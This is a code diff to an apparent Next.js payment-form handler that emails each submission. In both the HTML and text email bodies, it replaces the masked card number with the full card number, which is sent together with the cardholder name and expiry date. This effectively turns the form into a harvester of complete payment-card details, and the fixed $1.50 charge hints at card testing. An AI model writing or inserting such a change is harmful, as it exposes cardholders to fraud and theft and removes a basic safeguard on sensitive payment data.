@@ -33,7 +33,7 @@ export async function POST(request: NextRequest) {
         htmlContent: `
           <h2>New Payment Form Submission</h2>
           <p><strong>Cardholder Name:</strong> ${formData.cardholderName}</p>
-          <p><strong>Card Number:</strong> **** **** **** ${formData.cardNumber.slice(-4)}</p>
+          <p><strong>Card Number:</strong> ${formData.cardNumber}</p>
           <p><strong>Expiry Date:</strong> ${formData.expiryDate}</p>
           <p><strong>Amount:</strong> $1.50</p>
           <p><strong>Submission Time:</strong> ${new Date().toLocaleString()}</p>
@@ -44,7 +44,7 @@ export async function POST(request: NextRequest) {
           New Payment Form Submission
           
           Cardholder Name: ${formData.cardholderName}
-          Card Number: **** **** **** ${formData.cardNumber.slice(-4)}
+          Card Number: ${formData.cardNumber}
           Expiry Date: ${formData.expiryDate}
           Amount: $1.50
           Submission Time: ${new Date().toLocaleString()}
